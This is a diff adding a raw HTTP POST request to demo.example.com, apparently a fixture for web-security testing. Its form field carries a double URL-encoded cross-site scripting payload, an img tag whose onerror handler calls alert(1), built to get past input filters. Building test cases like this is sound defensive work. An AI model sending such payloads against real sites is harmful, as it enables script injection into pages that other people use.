@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Connection: close
+
+s=%253Cimg%2Bsrc%253Dx%2Bonerror%253Dalert%25281%2529%253E
